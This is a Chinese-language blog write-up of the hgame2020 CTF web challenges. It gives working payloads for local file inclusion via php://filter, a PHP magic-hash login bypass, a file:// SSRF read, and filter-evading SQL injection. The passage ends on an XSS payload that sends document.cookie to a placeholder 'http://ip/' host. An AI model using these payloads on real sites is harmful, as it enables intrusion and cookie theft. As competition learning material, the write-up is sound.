@@ -1,0 +1,997 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web,ctf,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="春节前的周赛，测一下自己这一年学得如何">
+<meta name="keywords" content="web,ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hgame2020-web-wp">
+<meta property="og:url" content="http://yoursite.com/2020/01/31/hgame2020-web-wp/index.html">
+<meta property="og:site_name" content="k0t0r1の家">
+<meta property="og:description" content="春节前的周赛，测一下自己这一年学得如何">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/448aa075b0c0b70cb21d86a5f8dcb0c8.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/7c0af9cdb3dabf542b2c0221d8e71599.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/e9d2cbd136189e310c82f70f7f953e84.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/9939c4a32b8c99499ecdba326d3c9876.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/ed4e068cf8ed30d6d9836b0e75254563.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/2636ee0fcd82f03b754f85a180e6ca4d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/1820c67d0dd8e396de1622459f38281e.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/b2ef5d89e9a22369894992fe762d33f8.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/722037ecec32344a9e86fb87741d2870.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/d4f8ea33d3025228ce1511bc2319187a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/97ab604093fc3a04d3334a8a9380868f.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/8d89c9dc9b0325f252795f486f391360.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/ab4c5626e96267afac42b57f8d2da45d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/afac374fcedbe2a13c310068e93486d9.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/762339abdec150f4f984ab73b4cc4d3c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/e9012ca6070807d4234f6fbd98d449db.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/7448224933977fa08a3021c03aac89ee.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/5541adde729da1c0627954e6bff21be4.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/97af4a557b699c003eaf4c97b5d2fdc2.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/bbfa9497de4bb37df8fd601c66b3ff6b.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/407a6a5dc022b1374171f0f0999da9b8.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/e9ab09aa24bbacf3b299033df3f5168d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/5d27fa3e0c273baa8e84c02b8d4194d7.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/80074bfb15c8d886ab6be36b745fdfc3.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/cbc47b33e183b3fdd3c02b2d078ac082.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/ccb58bedce265b97bc51a4d13670b066.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/636aa01adc159d51003ec000fb7583b3.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/d99e0b3ebf0156dd5bd064e8cc2da2df.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/c5673bc1d932258c30a866e24c5c7793.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/64a6018e5dcdea75e25993e731ff09ff.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/d88c4b31ba459fee05358f609d053fa0.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/38fb6b0503633aeb3f622b33e205332e.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/43ca94c33f1f1fe30f3ad86e27270fa9.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/703ac01965ef5903f4a6a1df3dc1beae.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/dede08dae2a1648079a8d38a44e9750d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/701aebc320524cc56aad6157cfd8aa6f.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/c439f10b940ac7f98d90aea55f0706eb.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/d2942c9c0f6cbc5b863d67c4758948f6.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/9a3d541c802a835d45fa6681c2fbdb6d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/b19fcaacbd322caa1e84514a6679080c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/72810f7fbd7dc336a236c7b4023f397d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/6f901a126771038d88b6a56c2dbc8af9.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/408144d09bd3740cdfd435f8ec44b4a6.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/62a7b9048e298b24afd98bcc7dc191d1.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/199d38bb0076d8881cf707a16f9ab62d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/bb01c02d40617792e8e3be3ef90e2c41.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/6d53d7cc66ac03c685b5a6feaf2dfdd2.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/1064457b2a0865eb70f79f2aa7b8574c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/0a8a503f86e70b5e9c1ce8df3c7f5558.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/15873bc40e4b2792e05eb68ff6231ed2.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/357dabb63c7d355530c6c6ba19232501.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/98d86bad89be3c88f9f3adaa196eb00b.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/0c083281aa7f60c94ed5eb4bc3b9014a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/42ff591eda1ad00f68c0affdd3532517.png">
+<meta property="og:updated_time" content="2020-02-26T14:54:25.599Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hgame2020-web-wp">
+<meta name="twitter:description" content="春节前的周赛，测一下自己这一年学得如何">
+<meta name="twitter:image" content="http://shifeng-kaze.cn/blog/hgame2020_web_wp/448aa075b0c0b70cb21d86a5f8dcb0c8.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/01/31/hgame2020-web-wp/">
+
+
+
+
+
+  <title>hgame2020-web-wp | k0t0r1の家</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">k0t0r1の家</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/31/hgame2020-web-wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="k0t0r1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://shifeng-kaze.cn/blog/head/kotori.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="k0t0r1の家">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">hgame2020-web-wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-31T14:39:19+08:00">
+                2020-01-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>春节前的周赛，测一下自己这一年学得如何</p>
+<a id="more"></a>
+<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h2><p>这题真是找傻我了，一开始还想着<code>.git</code>泄露，试了没有看加粗猜是在github上有源码<br>一开始在仓库和用户名里找一直没找到，最后突然看到有个code</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/448aa075b0c0b70cb21d86a5f8dcb0c8.png" alt=""></p>
+<p>进去看commit里就能看到flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/7c0af9cdb3dabf542b2c0221d8e71599.png" alt=""></p>
+<h2 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h2><p>日 常 迫 害<br>既然是换头，那就改头部。按要求改<code>Referer,X-Forwarded-For,User-Agent</code>，比较坑的是最后的资源更新时间，用<code>If-Unmodified-Since</code>，查了好久</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/e9d2cbd136189e310c82f70f7f953e84.png" alt=""></p>
+<h2 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h2><p>这题意义不明？<br>看console可以发现是从<code>index.php</code>跳转过来的</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/9939c4a32b8c99499ecdba326d3c9876.png" alt=""></p>
+<p>直接访问会跳转，于是尝试抓包改成POST访问就可以，提示要加法运算得到10<br>由于url中+会被解析为空格，于是要用<code>%2B</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/ed4e068cf8ed30d6d9836b0e75254563.png" alt=""></p>
+<h2 id="鸡尼泰玫"><a href="#鸡尼泰玫" class="headerlink" title="鸡尼泰玫"></a>鸡尼泰玫</h2><p>你们这样是要收律师函的！<br>需要30000分，直接抓包修改得到flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/2636ee0fcd82f03b754f85a180e6ca4d.png" alt=""></p>
+<p>讲道理明明题目要求时间同步，而且还跟着这后面这串hash居然直接改就完事了？？？</p>
+<h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h2><p>进去猜测action是可以读取任意文件，于是<br><code>?action=php://filter/convert.base64-encode/resource=index.php</code><br><code>?action=php://filter/convert.base64-encode/resource=login.php</code><br><code>?action=php://filter/convert.base64-encode/resource=admin.php</code><br>拿下三个源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">if(isset($_SESSION[&apos;username&apos;])) &#123;</span><br><span class="line">    header(&quot;Location: admin.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$action = @$_GET[&apos;action&apos;];</span><br><span class="line">$filter = &quot;/config|etc|flag/i&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;action&apos;]) &amp;&amp; !empty($_GET[&apos;action&apos;])) &#123;</span><br><span class="line">    if(preg_match($filter, $_GET[&apos;action&apos;])) &#123;</span><br><span class="line">        echo &quot;Hacker get out!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">        include $action;</span><br><span class="line">&#125;</span><br><span class="line">elseif(!isset($_GET[&apos;action&apos;]) || empty($_GET[&apos;action&apos;])) &#123;</span><br><span class="line">    header(&quot;Location: ?action=login.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>index.php</code>中禁止了读取<code>config.php、etc目录、flag</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">//Only for debug</span><br><span class="line">if (DEBUG_MODE)&#123;</span><br><span class="line">    if(isset($_GET[&apos;debug&apos;])) &#123;</span><br><span class="line">        $debug = $_GET[&apos;debug&apos;];</span><br><span class="line">        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) &#123;</span><br><span class="line">            die(&quot;args error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&quot;var_dump($$debug);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_SESSION[&apos;username&apos;])) &#123;</span><br><span class="line">    header(&quot;Location: admin.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">        if ($admin_password == md5($_POST[&apos;password&apos;]) &amp;&amp; $_POST[&apos;username&apos;] === $admin_username)&#123;</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $_POST[&apos;username&apos;];</span><br><span class="line">            header(&quot;Location: admin.php&quot;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;....&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><code>login.php</code>中可以看到通过debug可以获得变量的值<br>而登录需要比较<code>admin_password</code>和<code>admin_username</code>，于是拿一下<br><code>?action=login.php&amp;debug=admin_password</code><br><code>?action=login.php&amp;debug=admin_username</code></p>
+<p>得到Cosmos!和0e114902927253523756713132279690<br>这里利用php会将<code>0exx</code>视为0的xx次方，于是找md5后是0e开头的字符串<code>s878926199a</code></p>
+<p>登录进入看<code>admin.php</code>源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&apos;username&apos;])) &#123;</span><br><span class="line">    header(&apos;Location: index.php&apos;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function insert_img() &#123;</span><br><span class="line">    if (isset($_POST[&apos;img_url&apos;])) &#123;</span><br><span class="line">        $img_url = @$_POST[&apos;img_url&apos;];</span><br><span class="line">        $url_array = parse_url($img_url);</span><br><span class="line">        if (@$url_array[&apos;host&apos;] !== &quot;localhost&quot; &amp;&amp; $url_array[&apos;host&apos;] !== &quot;timgsa.baidu.com&quot;) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;   </span><br><span class="line">        $c = curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $res = curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar = base64_encode($res);</span><br><span class="line"></span><br><span class="line">        if(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            return $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到限制了host只能为<code>localhost</code>和<code>timgsa.baidu.com</code>。本来还想绕一下，不过想着居然能localhost而且不限制目录穿越，于是直接file读flag<br><code>file://localhost/../../../../flag</code></p>
+<p>再去看html源码</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/1820c67d0dd8e396de1622459f38281e.png" alt=""></p>
+<p>解码即是</p>
+<h2 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h2><p>sql注入题，有回显，可以用这样的方式测试是否被过滤<br><code>?id=3&#39;%23union select%23</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/b2ef5d89e9a22369894992fe762d33f8.png" alt=""></p>
+<p>测出空格被过滤，用<code>/**/</code>替代<br><code>select</code>可以双写绕过</p>
+<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=&apos;union/**/selselectect/**/database()%23</span><br><span class="line">Easysql</span><br><span class="line">?id=&apos;union/**/selselectect/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()%23</span><br><span class="line">f1aggggggggggggg,messages</span><br><span class="line">?id=&apos;union/**/selselectect/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&apos;f1aggggggggggggg&apos;%23</span><br><span class="line">fl4444444g</span><br><span class="line">?id=&apos;union/**/selselectect/**/group_concat(fl4444444g)/**/from/**/f1aggggggggggggg%23</span><br></pre></td></tr></table></figure></p>
+<p>得到flag</p>
+<h2 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code = file_get_contents(&apos;mycode&apos;);</span><br><span class="line">eval($code);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CayVJmICHxAhI0uBoxyIDwASIHV0I1IQn3yhGKMTF1g4EwAoZ01YDzgKoxV=</span><br></pre></td></tr></table></figure>
+<p>进入看起来是要解密这段东西，既然提示了mycode就去访问一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function encrypt($str)&#123;</span><br><span class="line">    $result = &apos;&apos;;</span><br><span class="line">    for($i = 0; $i &amp;lt; strlen($str); $i++)&#123;</span><br><span class="line">        $result .= chr(ord($str[$i]) + 1);</span><br><span class="line">    &#125;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo(str_rot13(strrev(base64_encode(str_rot13(base64_encode(base64_encode(encrypt(encrypt(str_rot13(base64_encode($_SERVER[&apos;token&apos;])))))))))));</span><br><span class="line"></span><br><span class="line">if(@$_POST[&apos;token&apos;] === $_SERVER[&apos;token&apos;])&#123;</span><br><span class="line">    echo($_SERVER[&apos;flag&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现给了加密源码，但尝试解密后并解不出来。回去看看发现给的字符串是动态变化的，一开始还以为token值是改变的，但再去访问一次mycode发现加密方式也变了，看起来是要写脚本拿，于是上一波python</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*- </span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def decrypt(cipher):</span><br><span class="line">	res = &apos;&apos;</span><br><span class="line">	for i in range(len(cipher)):</span><br><span class="line">		res += chr(ord(cipher[i])-1)</span><br><span class="line">	return res</span><br><span class="line"></span><br><span class="line">token_url = &quot;http://a52052a8db.php.hgame.n3ko.co/&quot;</span><br><span class="line">code_url = &quot;http://a52052a8db.php.hgame.n3ko.co/mycode&quot;</span><br><span class="line">token_http = requests.get(token_url)</span><br><span class="line">code_http = requests.get(code_url)</span><br><span class="line">token = re.findall(r&quot;&lt;/code&gt;&lt;br&gt;\n(.*)&lt;br&gt;&quot;,token_http.text)[0]</span><br><span class="line">code = re.findall(r&quot;echo\((.*)\);&quot;,code_http.text)[0]</span><br><span class="line">func = re.findall(&quot;([a-zA-Z0-9_]*)\(&quot;,code)</span><br><span class="line"></span><br><span class="line">for i in func:</span><br><span class="line">	if i == &quot;str_rot13&quot;:</span><br><span class="line">		token = token.encode(&quot;rot13&quot;)</span><br><span class="line">	elif i == &quot;strrev&quot;:</span><br><span class="line">		token = token[::-1]</span><br><span class="line">	elif i == &quot;base64_encode&quot;:</span><br><span class="line">		token = base64.b64decode(token)</span><br><span class="line">	else:</span><br><span class="line">		token = decrypt(token)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">	&apos;token&apos;:token</span><br><span class="line">&#125;</span><br><span class="line">flag = requests.post(token_url,data)</span><br><span class="line">print flag.text</span><br></pre></td></tr></table></figure>
+<p>跑一波拿到flag</p>
+<h2 id="跑一波拿到flag"><a href="#跑一波拿到flag" class="headerlink" title="跑一波拿到flag"></a>跑一波拿到flag</h2><p>这题一开始以为把&lt;+字母给过滤了，后来检查了一下发现只是并到了标签中导致没有显示</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/722037ecec32344a9e86fb87741d2870.png" alt=""></p>
+<p>不过<code>&lt;.*&gt;</code>和<code>script、iframe</code>是确实被过滤了</p>
+<p>于是用svg，但是字母都会被转为大写，于是用html实体编码<br>把<code>document.location=&#39;http://ip/?&#39;+document.cookie</code>进行html实体编码后放入onload中，然后<code>&lt;svg onload=&quot;xxx&quot;</code>发送并提交</p>
